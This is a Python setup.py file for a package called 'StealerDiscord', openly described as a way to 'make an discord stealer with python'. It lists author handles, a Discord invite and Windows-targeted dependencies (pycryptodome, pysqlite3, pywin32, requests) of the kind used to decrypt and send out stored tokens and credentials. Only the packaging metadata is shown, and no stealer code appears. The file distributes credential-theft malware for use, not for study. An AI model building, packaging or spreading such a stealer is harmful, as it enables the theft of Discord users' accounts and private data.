from setuptools import setup, find_packages

setup(
    name="StealerDiscord",
    version="1.5",
    author=["VMS_SHOP", "yashing2", "phantoms_._"],
    author_email="discordyashing@gmail.com",
    url="https://discord.gg/tRgE7eFTkt",
    description="A simple package to make an discord stealer with python",
    packages=['StealerDiscord'],
    install_requires=["pycryptodome", "requests", "vpo", "pillow", "datetime", "psutil", "pysqlite3", "pywin32"],
    python_requires=">=3.10",
    classifiers=[
            "Environment :: Win32 (MS Windows)",
            "Natural Language :: French",
            "Operating System :: Microsoft :: Windows :: Windows 10",
            "Operating System :: Microsoft :: Windows :: Windows 11",
            "Programming Language :: Python :: 3.10",
            "Programming Language :: Python :: 3.11",
            "Programming Language :: Python :: 3.12",
            "Programming Language :: Python :: 3.13",
            "Topic :: System",
            "Topic :: System :: Logging",
        ],
)